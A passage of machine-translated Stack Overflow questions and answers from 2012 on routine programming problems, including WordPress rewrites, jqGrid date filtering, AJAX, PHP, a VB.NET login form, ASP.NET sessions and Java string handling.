> 赞同：0
> 
> 时间：2012-08-14T15:05:29.000

它只打印列表中的第一项的原因是因为 FLIST 中没有“Jacob Francis”。

附带说明一下，确保 FLIST 的大小写保持不变。

这是使用单个列表推导的可能实现。

```
FLIST = ["Mary Smith", "Kevin Bacon"]
JG = [[3928, "Mary Smith"], [2920, "Jacob Francis"]]

ultralist = [x for x in JG if x[1] in FLIST] 
```

# entity-framework-4.1 - Code First - 如何创建数据库？

> ID：11955071
> 
> 赞同：1
> 
> 时间：2012-08-14T14:54:51.370
> 
> 标签：entity-framework-4.1, code-first

我很久以前就使用 EF DB-First 方法并且喜欢它。但现在我必须先使用代码。我创建了我的模型，我的上下文类，但是现在如何按类创建数据库？

# java - 确定哪个条件导致执行 if 语句

> ID：11955072
> 
> 赞同：2
> 
> 时间：2012-08-14T14:54:53.223
> 
> 标签：java

所以我有一个 if 语句，如下所示：

```
List<Integer> portsInUse = new ArrayList<Integer>();
. . .
if(portsInUse.contains((Integer) newPort1) 
        || portsInUse.contains((Integer) newPort2){

    fail(_____, "This port is already in use.");
} 
```

`newPort1`并`newPort2`通过从 HttpServletRequest 中挖掘它们来分配。 `fail(String parameter, String message)`是一种内部方法，用于提醒用户出现问题。

我想做的是能够判断哪个条件导致 if 语句触发，然后相应地设置失败消息。我可以这样做，还是我必须做这样的事情：

```
List<Integer> portsInUse = new ArrayList<Integer>();
. . .
boolean port1 = portsInUse.contains((Integer) newPort1);
boolean port2 = portsInUse.contains((Integer) newPort2);
if(port1 || port2){
    if(port1)
        fail("newPort1", "This port is already in use.");
    else
        fail("newPort2", "This port is already in use.");
} 
```

或者，第三种选择，我应该像这样分解条件：

```
List<Integer> portsInUse = new ArrayList<Integer>();
. . .
if(portsInUse.contains((Integer) newPort1) {
    fail("newPort1", "This port is already in use.");
}
if(portsInUse.contains((Integer) newPort2) {
    fail("newPort2", "This port is already in use.");
} 
```

我确定我把事情复杂化了，但提前谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T14:57:48.097

第四种选择...

```
List<Integer> portsInUse = new ArrayList<Integer>();
. . .
if(portsInUse.contains((Integer) newPort1) {
    fail("newPort1", "This port is already in use.");
}
else if(portsInUse.contains((Integer) newPort2) {
    fail("newPort2", "This port is already in use.");
}else{
    //No ports in use
} 
```

第五个选项...

```
List<Integer> portsInUse = new ArrayList<Integer>();
. . .
if(portsInUse.contains((Integer) newPort1) {
    if(portsInUse.contains((Integer) newPort2) {
        //both ports in use
    }else{
        //port 1 in use
    }
}
else if(portsInUse.contains((Integer) newPort2) {
    //Port 2 in use
}else{
    //No ports in use
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T14:58:16.130

由于您需要确定正在使用哪个特定端口，因此第三个选项会更理想。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T14:58:38.097

我认为您的第三个选项是最好的，因为您避免了 option2 的额外条件`if(port1 || port2)`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-14T15:08:28.037

```
List<Integer> portsInUse = new ArrayList<Integer>();
. . .
List<Integer> portsToCheck = new ArrayList<Integer>();

portsToCheck.add(newPort1);
portsToCheck.add(newPort2);
...    

for (Integer port: portsToCheck){
    if (portsInUse.contains(port)) {
        fail(port+"", "This port is already in use.");  
    }
} 
```

# wordpress - Wordpress 自定义帖子类型的自定义 category.php？

> ID：11955078
> 
> 赞同：1
> 
> 时间：2012-08-14T14:55:11.153
> 
> 标签：wordpress, categories, custom-post-type

如何创建仅显示来自自定义帖子类型的帖子的 category.php 模板（例如 category-testimonial.php）？

这是我创建自定义帖子类型的代码：

```
function testimonials_custom_init() {

    $labels = array(
        'name' => _x('Testimonials', 'post type general name'),
        'singular_name' => _x('Testimonial', 'post type singular name'),
        'add_new' => _x('Add New', 'testimonial'),
        'add_new_item' => __('Add New Testimonial'),
        'edit_item' => __('Edit Item'),
        'new_item' => __('New Testimonial'),
        'view_item' => __('View Testimonial'),
        'search_items' => __('Search Testimonials'),
        'not_found' =>  __('Nothing found'),
        'not_found_in_trash' => __('Nothing found in Trash'),
        'parent_item_colon' => ''
    );

    $args = array(
        'labels' => $labels,
        'public' => true,
        'publicly_queryable' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'show_in_nav_menus' => false,
        'query_var' => true,
        'rewrite' => array('slug','pages'),
        'capability_type' => 'post',
        'hierarchical' => false,
        'menu_position' => 5,
        'has_archive' => 'testimonials',
        'supports' => array('title','editor','thumbnail','excerpt',)
      );

    register_post_type( 'testimonials' , $args );
}
add_action( 'init', 'testimonials_custom_init' ); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:08:58.183

听起来您混淆了分类法（标签和类别）和帖子类型（帖子、页面、自定义帖子类型）。您真正想要做的是为您的自定义帖子类型创建一个存档模板，例如`archive-custom_post_type.php`.

您还需要确保在创建自定义帖子类型时调用`register_post_type()`您设置`has_archive => 'custom_post_type'`的 . 然后，当您导航到 时`http://yourdomain.com/custom_post_type`，您将转到您的自定义存档模板。

有关更多信息，请参阅 WP 关于[register_post_type](http://codex.wordpress.org/Function_Reference/register_post_type)和[Template Hierarchy](http://codex.wordpress.org/Template_Hierarchy)的文档。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-03-01T19:27:41.700

这个问题可能很老，但是，这可以帮助其他试图获得自定义帖子类型的人显示自定义类别模板。假设您有一个名为“事件”的自定义帖子类型。默认情况下，您可能希望拥有“category-events.php”并过滤仅与此自定义帖子类型关联的类别。Wordpress 不会让你这样做（但也许）。

我的解决方法是首先在您的子主题中创建一个空白 category.php（或者您将删除该子主题文件中已有的任何内容并替换为下面的代码）。

然后粘贴该代码：

```
 if ( isset( $post_type ) && locate_template( 'category-' . $post_type . 
'.php' ) ) 

{

get_template_part( 'category', $post_type );

exit;

 } 
```

就是这样。

现在您需要创建您的实际模板文件，例如“category-events.php”。在该文件中，您可以使用 get_header('your-custom-header'); 从您的 archive.php 或任何您想要的自定义模板中复制/粘贴代码；get_footer('你的自定义页眉'); 以及介于两者之间的任何内容。当然，您需要让您实际过滤该类别的代码：

```
if( have_posts() ) {
    while( have_posts() ) {
      the_post(); ------ blah blah blah---your code 
```

# jqgrid - JQGrid 日期时间高级过滤器

> ID：11955081
> 
> 赞同：3
> 
> 时间：2012-08-14T14:55:16.753
> 
> 标签：jqgrid

我被困在这里 - 在开始生产之前要做的最后一件事。

来自 oracle 的日期格式如下：“8/14/2012 10:46:48 AM”

我在 jqgrid 上使用以下内容：

```
{ name: 'CreationDate', index: 'CreationDate', formatter: 'date', formatoptions:    { 'srcformat': 'ISO8601Long', 'newformat': 'm/d/Y - g:i A' }, sorttype: 'date', width: 95, align: 'right', resizable: false }, 
```

我在网格上显示以下内容：“08/14/2012 - 10:46AM”

问题是当我尝试使用高级过滤器时它不起作用。我的猜测是因为时间问题，有什么建议可以解决这个问题吗？

**更新**

奥列格，我复制了您发布的代码以及您的更改，但仍然没有。我正在使用高级过滤器。感谢您的所有帮助，我真的非常感谢。我希望我能给你送些啤酒去德国:o)

![不工作样本](../Images/0fb3067d5e855123b8101187f597bc59.png)

![带有全文的工作示例](../Images/c8d9e9712da86abf24bfd9da579937c8.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T20:17:53.050

我认为主要问题是您使用jqGrid 目前不支持其中的格式进行本地过滤/搜索`g`。`newformat`您可以尝试改用`H` 格式。或者，您可以使用[答案](https://stackoverflow.com/a/11800979/315935)中描述的修复程序。

**更新**：[演示](http://www.ok-soft-gmbh.com/jqGrid/SearchDate2.htm)`formatter: 'date', formatoptions: { 'srcformat': 'ISO8601Long', 'newformat': 'm/d/Y - g:i A' }`显示，在应用我引用的修复程序后，可以使用高级搜索对话框。您可以尝试演示并输入`10/04/2012 - 5:55 PM`我在下图中使用的相同数据（）。您必须看到以下结果：

![在此处输入图像描述](../Images/64816e1da39d4ebd06fc60029e2309cf.png)

**更新 2**：在为您准备另一个演示期间，我在内部[parseDate](https://github.com/tonytomov/jqGrid/blob/master/js/grid.base.js#L82-142)函数中发现了另一个错误。`parseDate`问题是，只有当需要解析的日期包含与指定格式相同的元素时，函数的当前实现才能正确工作。例如，使用格式`10/04/2012`将错误地解析日期。`'m/d/Y - g:i A'`要修复错误，可以包含以下行

```
if(typeof date[k] === "undefined") { continue; } 
```

[作为循环](https://github.com/tonytomov/jqGrid/blob/master/js/grid.base.js#L98)体的第一行。你的固定版本`jquery.jqGrid.src.js`可以到[这里](http://www.ok-soft-gmbh.com/jqGrid/jquery.jqGrid-4.4.0/js/jquery.jqGrid.src-fixed1.js)。

在演示中，我使用[jqGrid 搜索](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:singe_searching)`multipleSearch: true`选项。结果，可以指定日期的间隔，例如

```
10/04/2012 <= x <= 10/05/2012 
```

相应的搜索对话框将如下图所示，您将能够按日期间隔进行过滤

![在此处输入图像描述](../Images/eb657e8c9d60b53713df210ac26c5dad.png)

# javascript - 使用 ajax 将 HTML 文档附加到元素

> ID：11955084
> 
> 赞同：0
> 
> 时间：2012-08-14T14:55:23.613
> 
> 标签：javascript, ajax

我已经使用各种在线资源编写了这段代码，但我似乎无法弄清楚最后一部分。

```
function loadajax (event) {
    event.preventDefault();
    xhr = new XMLHttpRequest();
    xhr.onreadystatechange  = function(){ 
        if(xhr.readyState  == 4){
            if(xhr.status  == 200) 
                document.ajax.dyn="Received:"  + xhr.responseText; 
            else
                document.ajax.dyn="Error code " + xhr.status;
        }
    }; 

    xhr.open('GET', this.href, true);
    var content = document.getElementsByTagName('article')[0];

    content.innerHTML = xhr.responseText;
} 
```

在我需要向我的页面添加内容之前，它似乎有效。确实`content.innerHTML = xhr.responseText;`没有返回任何内容。我得到一个简单的 HTML 文件，如何将它发布到我的页面中？我究竟做错了什么？

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:00:15.933

ajax 调用是异步的。如果您将该`content.innerHTML = xhr.responseText;`行移到这样的`onreadystatechange`函数中，它将起作用：

```
function loadajax (event) {
event.preventDefault();
xhr = new XMLHttpRequest();
 xhr.onreadystatechange  = function() 
    { 
       if(xhr.readyState  == 4)
       {
        if(xhr.status  == 200) 
            document.ajax.dyn="Received:"  + xhr.responseText; 

            content.innerHTML = xhr.responseText;
        else
            document.ajax.dyn="Error code " + xhr.status;
        }
    }; 

xhr.open('GET', this.href, true);
var content = document.getElementsByTagName('article')[0];

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:00:07.603

将您的 contet.innerHTML 放入状态 200 条件中。

您只是在内容真正存在之前将其分配给内容。在 ajax 从服务器获取它之前。

# php - 打印关联数组时出错（错误：意外的“”，需要 T_STRING 或 T_NUM STRING）

> ID：11955086
> 
> 赞同：1
> 
> 时间：2012-08-14T14:55:28.250
> 
> 标签：php, syntax-error, associative-array

我有代码：

```
print <<<HERE
<p>$myInfo["lastName"]</p>
HERE; 
```

并得到错误：

> 错误：意外的“”，需要 T_STRING 或 T_NUM STRING

问题是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-14T14:58:27.173

变量插值语法是

```
"$var[key]" 
```

*或者*

```
"{$var['key']}" 
```

*请注意使用复杂语法*所需的花括号。

[http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing](http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing)

# vb.net - 我正在尝试在 VB.NET 中创建登录表单。我在运行表单时遇到了一些困难

> ID：11955091
> 
> 赞同：1
> 
> 时间：2012-08-14T14:55:40.460
> 
> 标签：vb.net

我收到错误“未处理的无效强制转换异常”。我正在使用 SQL Server 2008 和 Visual Studio 2008。我从字符串“Jack”转换为布尔类型无效。

请参阅下面我的表单代码：

```
Imports System.Boolean

Imports System.Data.SqlClient

Public Class Form1

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim username As String
        Dim pswd As String
        Dim conn As SqlConnection
        Dim cmd As SqlCommand
        Dim reader As SqlDataReader

        username = txt_username.Text
        pswd = txt_password.Text
        txt_username.Text = Focus()
        txt_password.Visible = "False"
        Try
            conn = New SqlConnection("data source=TAMIZHAN\SQLEXPRESS;persistsecurity info=False;initial catalog=log;User ID=sa;Password=123");
            cmd = New SqlCommand("Select usename,passw from Userlog where usename='" + username + "' & passw='" + pswd + "'")
            conn.Open()
            reader = cmd.ExecuteReader()
            If (String.Compare(pswd and '"+passw+"')) Then
                MsgBox("Success")
            End If
            If (reader.Read()) Then

                MsgBox("Login success")

            End If
            conn.Close()
        Catch ex As Exception
            MsgBox("Error"+ex.Message());
        End Try
    End Sub
End Class 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T14:59:46.427

string.Compare 返回一个整数而不是布尔值，应该以这种方式调用

```
If (String.Compare(pswd,passw) = 0) Then 
    MsgBox("Success") 
End If 
```

请[参阅](http://msdn.microsoft.com/en-us/library/84787k22.aspx)MSDN 上的参考资料

但是，您的代码目前存在许多问题：

*   您正在使用字符串连接来构建您的 sql 文本（SqlInjection，引用问题）。
*   您不使用 Using 语句（在出现异常时连接保持打开状态）。
*   似乎绝对不需要比较逻辑。

# wordpress - Wordpress URL 重写不工作/注册

> ID：11955093
> 
> 赞同：1
> 
> 时间：2012-08-14T14:55:41.297
> 
> 标签：wordpress

我一直在努力解决 Wordpress URL 重写问题，但我没有运气。

我想做的事：

我构建了一个自定义插件，用户可以在其中从各种选项构建产品。这些选项共同构建了一个代码，该代码引用了客户构建的独特产品。

代码可能类似于`140-3-WPA-ABC-2.`

该插件将出现在一个专用页面上：

```
http://wordpress-site/configurator/ 
```

我希望具有预先存在代码的客户能够将其输入到 URL 中，如下所示：

```
http://wordpress-site/configurator/140-3-WPA-ABC-2/ 
```

因此，插件获取变量，并使用它来构建正确的产品。

问题

它应该相当简单，但我无法使用 Wordpress URL 重写规则进行任何工作，我什至无法获得任何看似注册为 Wordpress 查询变量的东西。

我一直在主插件初始化代码中尝试以下内容：

```
add_filter( 'query_vars', 'conf_query_vars' );
add_action( 'init', 'cong_rewrites' );

function conf_query_vars($query_vars){
    $query_vars[] = 'product_code';
    return $query_vars;
}

function conf_rewrites(){
    add_rewrite_rule(
        'configurator/([^/]+)/?$',
        'index.php?product_code=$matches[1]',
        'top'
    );
} 
```

如果我然后尝试打开，`http://wordpress-site/configurator/140-3-WPA-ABC-2/`我会收到一个找不到页面的错误。回显 query_vars 似乎表明未创建变量“product_code”。

ps 我试过刷新重写缓存。很抱歉交叉发布到 Wordpress.stackexchange.com - 但这里的编程问题似乎更好？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-27T09:44:07.930

试试这个，我遇到了同样的问题。

```
add_action('init', function() {
    add_rewrite_endpoint('sponsor', EP_ALL);
});

add_filter('request', function($args) {
    print_r($args);
    return $args;
}); 
```

我认为您应该只集成函数 add_rewrite_endpoint。

# asp.net - ASP.NET：是否可以保留复杂的对象，例如 list<> 是会话？

> ID：11955094
> 
> 赞同：3
> 
> 时间：2012-08-14T14:55:43.523
> 
> 标签：asp.net, session-state

ASP.NET：是否可以保留复杂的对象，例如`List<object>`会话？如果是，该怎么做？我试图在会话中保留一个列表，但有人告诉我我无法将该列表转换为字符串。

# 编辑

```
[Serializable]
public class Client
{
        public string ClientType { get; set; }
        public string ClientName { get; set; }
        public string SubClientName { get; set; }
        public string Project { get; set; }
        public string Service { get; set; }
        public string Activity { get; set; }
}
List<Client> ListOfClients;
protected void Page_Load(object sender, EventArgs e)
{
     if(!IsPostBack)
     {
        ListOfClients = new List<Client> { new Client()}; 
        Session["ListOfClients"] = ListOfClients;//This is where the error occurs
                                                 //Cannot convert List<Client> to string... 
     }  
} 
```

有许多操作要执行，但想法是保留会话中客户端列表中的任何内容。

感谢您的帮助。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-14T14:59:15.903

是的，您可以将任何[可序列化对象](https://stackoverflow.com/q/447898/370103)存储到会话变量中。例如：

```
List<string> list;

Session["list"] = list; 
```

然后返回值：

```
List<string> list = (List<string>)Session["list"]; 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-14T15:10:29.143

只要[会话状态](http://msdn.microsoft.com/en-us/library/ms178586.aspx)处于`InProc`模式，您就可以在会话对象中存储任何内容。

否则，您存储的内容必须是可序列化的。

请注意，您存储的类型是`object`，因此您转换了返回的引用：

```
ListOfClients = Session["ListOfClients"] as List<Client>; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-15T12:31:55.053

由于您在评论中写道，错误发生在编译时而不是在运行时，我怀疑您还有一些名为的其他对象`Session`掩盖了`Page.Session`.

尝试将鼠标悬停在 Visual Studio 中的会话文本上。工具提示应该向您显示 Session 的类型

```
System.Web.SessionState.HttpSessionState 
```

如果它显示其他内容，您需要同时搜索您的标记（.aspx 文件）和代码隐藏文件，以查看您是否使用名称/id 声明了其他内容，`Session`然后更改该名称/id。

# c# - 获取excel文件的名称

> ID：11955096
> 
> 赞同：2
> 
> 时间：2012-08-14T14:55:57.533
> 
> 标签：c#, excel

让我先说这是我第一次这样做。

我正在为 excel 开发一个 c# 加载项，其中用户应该打开一个文件，然后按加载项中的开始按钮来启动所有过程。

现在，我想知道的是如何获取打开文件的名称。我不知道文件的位置，所以我不能使用 FileInfo。

文件名为“Cxxx_Curr_REC_surplus.xls”类型。

我一直在尝试，但我得到的只是活动工作簿的名称。

我想知道这是否可能。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-15T14:54:55.730

试试这个：

```
Microsoft.Office.Interop.Excel.Application myExcel;
this.Activate ( );
myExcel = ( Microsoft.Office.Interop.Excel.Application ) System.Runtime.InteropServices.Marshal.GetActiveObject ( "Excel.Application" )
MessageBox.Show ( myExcel.ActiveWorkbook.FullName ); // gives full path
MessageBox.Show ( myExcel.ActiveWorkbook.Name ); // gives file name 
```

参考：
[如何使用 Visual C# 自动运行 Office 程序的实例](http://support.microsoft.com/kb/316126)
[MSDN](http://msdn.microsoft.com/en-US/library/microsoft.office.interop.excel._workbook.fullname.aspx)

# c# - 抛出错误并提供消息时，ResponsStatus 的错误消息不应为空

> ID：11955099
> 
> 赞同：3
> 
> 时间：2012-08-14T14:56:01.710
> 
> 标签：c#, .net, rest, servicestack

我正在使用 ServiceStack，并且在引发错误时无法在 ResponseStatus 中取回错误消息。

我的服务请求/响应是根据 ServiceStack 要求的命名约定命名的。

要求：

```
namespace DataDictionary.ServiceModel
{
    // Create the name of the Web Service (i.e. the Request DTO)
    [RestService("/receivables/{id}", "GET")]
    [RestService("/years/{year}/processes/{processname}/receivables/{name}", "GET")]
    [DataContract]    
    public class ReceivableRequest
    {
        [DataMember]
        public int id { get; set; }

        [DataMember]
        public int year { get; set; }

        [DataMember]
        public string processname { get; set; }

        [DataMember]
        public string name { get; set; }
    }
} 
```

回复：

```
namespace DataDictionary.ServiceModel
{
    [DataContract]
    public class ReceivableRequestResponse : IHasResponseStatus
    {
        public ReceivableRequestResponse()
        {
            this.ResponseStatus = new ResponseStatus();
        }

        [DataMember]
        public int id { get; set; }

        [DataMember]
        public string name { get; set; }

        [DataMember]
        public Uri process { get; set; }

        [DataMember]
        public Uri year { get; set; }

        #region IHasResponseStatus Members

        [DataMember]
        public ResponseStatus ResponseStatus {get; set;}

        #endregion
    }
} 
```

服务：

```
namespace DataDictionary.ServiceInterface
{
    // Create the Web Service implementation 
    public class ReceivableService : RestServiceBase<ReceivableRequest>
    {
        private readonly IRepository<Receivable> m_receivableRepository;

        public ReceivableService(IRepository<Receivable> receivableRepository)
        {
            m_receivableRepository = receivableRepository;
        }

        public override object OnGet(ReceivableRequest request)
        {
            if (request != null && request.id > 0)
            {
                return GetSpecificReceivable(request.id);
            }            
        }

        private object GetSpecificReceivable(int id)
        {
            Receivable receivable = m_receivableRepository.SingleOrDefault(rec => rec.Id == id);
            if (receivable != null)
            {
                return receivable;
            }
            else
            {
                throw new HttpError(HttpStatusCode.NotFound, new ArgumentException(string.Format("Could not find receivable with id {0}.", id)));
            }        
        }        
    }
} 
```

当我对服务进行单元测试时返回错误消息

```
[Test]
public void Can_GET_Receivable_Not_Found_Successfully()
{
    //given
    var year = new Year { Name = 2006 };

    IRepository<Year> repository = Kernel.Get<IRepository<Year>>();
    repository.Add(year);

    var process = new Process { Name = "TEST", Year = year };
    year.AddProcess(process);

    var receivable = new Receivable { Name = "File1" };
    process.AddReceivable(receivable);

    repository.Update(year);

    var service = Kernel.Get<ReceivableService>();
    var request = new ReceivableRequest { year = 2011, processname = "TEST", name = "File1" };

    //when
    try
    {
        var entity = (Receivable)service.OnGet(request);
    }
    //then
    catch (HttpError e)
    {
        e.Message.ShouldEqual("Could not find receivable File1 from process TEST in year 2011.");
        e.StatusCode.ShouldEqual(HttpStatusCode.NotFound);
    }
} 
```

但是，当我使用 fiddler 发送请求时，我希望错误消息以 JSON 格式返回，状态代码 404 可用但没有错误消息。

如何访问错误消息？

# php - CSV PDO 插入循环？

> ID：11955101
> 
> 赞同：0
> 
> 时间：2012-08-14T14:56:03.103
> 
> 标签：php, loops, csv, upload, pdo

我最近问过如何将 CSV 插入 MySQL 数据库。有人建议我使用 LOAD DATA LOCAL INFILE，但事实证明这在我的主机上被禁用，因此不再是一个选项。回到 PHP 循环..

我在循环临时上传的结果时遇到问题，因为我在插入时将值映射到数组。因此，在多行上，这会导致两次输入相同的条目（第一行的值），因为数组值是明确定义的。

它正在插入 1、2、3、4，然后是 1、2、3、4。我想插入数组的 1、2、3、4，然后是 5、6、7、8。

解决方案是什么（除了 hacky for's 和 row++）？

提前致谢。

```
$handle = fopen($_FILES['csv']['tmp_name'], "r");
$sql = "INSERT INTO tbl (col1, col2, col3, col4) VALUES (?, ?, ?, ?)";

while (($data = fgetcsv($handle, 1000, ",")) !== FALSE) {
$query = $db->prepare($sql);
if ($query->execute(array($data[0],$data[1],$data[2],$data[3]))) return true;
   else return false;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:41:36.837

我唯一能想到的是你的循环只执行一次，但你运行了两次循环。（您的循环中有一个“return”语句。）

以下应该有效：

```
function loadCsv($db, $filename){

    $fp = fopen($filename, 'rb');
    $sql = 'INSERT INTO tbl (col1, col2, col3, col4) VALUES (?,?,?,?)';
    $pstmt = $db->prepare($sql);

    while (FALSE !== ($data = fgetcsv($fp, 1000))) {
        $cols = array_slice($data, 0, 4);
        $query->execute($cols);
    }

    $pstmt->closeCursor();
    fclose($fp);
} 
```

为了获得最大的兼容性和性能，我建议使用类似[这个`connect_PDO`函数](https://stackoverflow.com/a/10455228/1002469)的函数连接到 PDO 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:03:22.310

首先，您只需要准备一次查询（这是使用准备好的语句的两个主要优点之一，另一个是防止注入），因此将调用放在循环`prepare()`之前`while`，而不是在循环内部。

除此之外，我认为您发布的代码没有理由按照您声称的方式运行，除非您的数据在 CSV 文件中重复。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T20:07:27.207

问题在于 return 声明。删除退货立即解决了问题。

不幸的是，发布此答案的用户已将其删除。

感谢大家对此的建议和帮助！

# android - 我们可以访问我的安卓手机的麦克风驱动程序吗

> ID：11955102
> 
> 赞同：18
> 
> 时间：2012-08-14T14:56:11.510
> 
> 标签：android, c, android-ndk, linux-kernel, java-native-interface

如果可以，我们可以使用 Android NDK 访问我的 android 手机的麦克风驱动程序吗？那我该怎么办？

我可以将驱动程序设置为禁用一段时间吗？

我可以检测到正在使用我的手机麦克风的手机的应用程序名称吗？

根据 Android 多媒体框架，MediaServer 负责打开设备，基于 Java 的音频应用程序将其作为客户端连接。数据传输发生在 Binder。可能正因为如此，只看到一个打开音频设备的进程。现在我想知道如何从 MediaServer 获取信息？任何人都知道这个或任何其他想法来查找哪个应用程序正在使用我的手机麦克风，我无法使用 root 权限。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T11:03:27.563

你不能。
:-)（即使使用 NDK ）

**某些设备可能**存在特定的黑客攻击。
但是它们肯定会干扰Android框架的正常运行。

# java - 打印指定的扩展文件

> ID：11955105
> 
> 赞同：2
> 
> 时间：2012-08-14T14:56:16.753
> 
> 标签：java, string

我必须编写一个代码，将文件名作为 String[] 中的输入，并返回所有扩展名为“.java”的文件。

这是我的代码：

```
 public String[] getJavaFiles(String[] fileNames){
    int l=fileNames.length;
    int count=0;
    int l2,i=0;
    String s;
    String dummy[]=new String[l];
    for (i=0; i<l; i++){
        s=fileNames[i];
        if ( s.endsWith(".java"))
            {
            dummy[i-count]=s;
            count++;
            }
        }
    String javaFileNames[]=new String[count];
    for (i=0; i<count; i++){
        javaFileNames[i]=dummy[i];
        }
    return (javaFileNames);
    }
} 
```

我得到这个输出：

```
can.java
and.java
can.java
and.java.java
and.java.xys.pdf.java.doc.java
[Ljava.lang.String;@67d479cf 
```

我的问题是：我得到的最后一行是什么？？： **[Ljava.lang.String;@67d479cf**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:03:15.207

您可以使用 endsWith 检查字符串的结尾

```
if(s.endsWith(".java")) 
```

您可以使用 Arrays.toString 打印一个数组

```
System.out.println(Arrays.toString(javaFileNames)); 
```

您必须这样做，因为数组作为普通对象不是很有用，例如 toString、notify、wait、equals、hashCode 对数组没有任何用处。

可能更好的是使用列表

```
List<String> javaNames = new ArrayList<>();
for (int i=0; i<l; i++)
    if (fileNames[i].endsWith(".java"))
        javaNames.add(fileNames[i]);
System.out.println(javaNames);
return javaNames.toArray(new String[javaNames.size()]); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T14:59:51.223

使用`String.endsWith`. 很简单：

```
String[] files = {"file1.java", "file2.java"};
for(String f: files)
     if(f.endsWith(".java"))
          System.out.println(f); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T15:00:20.437

您会得到 **[Ljava.lang.String;@67d479cf**作为默认 toString() 方法的结果，该方法定义在 Object 类中，当您对数组执行 System.out.println 时会调用该方法。

```
 public String toString() {
    return getClass().getName() + "@" + Integer.toHexString(hashCode());
    } 
```

你的对象是一个数组，默认情况下java不会'toStringify'它的内容。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-14T15:00:37.300

那是一个哈希码字符串。您不应该直接打印数组。从数组中取出值`javaFileNames`并打印。

```
for(int i = 0;  i < javaFileNames.length; i++)
    System.out.println(javaFileNames[i]); 
```

# c# - 尝试编译调用本机代码的类时，Mono 编译器崩溃

> ID：11955109
> 
> 赞同：1
> 
> 时间：2012-08-14T14:56:36.543
> 
> 标签：c#, macos, mono, interop, cfrunloop

我有以下类，它使用 Mono（在 Mac 中）将一些运行循环调用从本机代码映射到 C#，并且编译器无法正常工作，它在尝试编译时总是崩溃。我已将其删除到仅包含**此类**的单独项目中，但它仍然损坏，因此问题似乎与此代码有关。

有没有人见过这样的事情？

```
using System;
using System.Threading;

namespace Integration.Mac
{

    public class CommonRunLoop
    {

        static IntPtr runLoopReference;

        public static IntPtr CommonRunLoopReference {
            get {
                return runLoopReference;
            }
        }

        static CommonRunLoop() {

            AutoResetEvent lockObj = new AutoResetEvent (true);

            Thread runLoop = new Thread (delegate() {
                runLoopReference = CFRunLoopGetCurrent ();
                lockObj.Set ();
                CFRunLoopRun ();
            });

            runLoop.IsBackground = true;
            runLoop.Name = "Common-Sync-Run-Loop";
            lockObj.WaitOne();
        }

        [DllImport ("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")]
        extern static IntPtr CFRunLoopGetCurrent ();

        [DllImport ("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")]
        extern static IntPtr CFRunLoopGetMain ();

        [DllImport ("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")]
        extern static void CFRunLoopRun ();

    } 
} 
```

编译器输出如下：

> 构建解决方案：calling-native-code-mono（调试）
> 
> 构建：calling-native-code-mono (Debug) 执行主编译... /Library/Frameworks/Mono.framework/Versions/2.10.9/bin/dmcs /noconfig "/out:/Users/mauricio/Projects/calling -native-code-mono/bin/Debug/calling-native-code-mono.dll" "/r:/Library/Frameworks/Mono.framework/Versions/2.10.9/lib/mono/4.0/System.dll" "/r:/Library/Frameworks/Mono.framework/Versions/2.10.9/lib/mono/4.0/System.Core.dll" /nologo /warn:4 /debug:full /optimize- /codepage:utf8 "/定义：调试”/t:library“/Users/mauricio/Projects/calling-native-code-mono/CommonRunLoop.cs”“/Users/mauricio/Projects/calling-native-code-mono/AssemblyInfo.cs”
> 
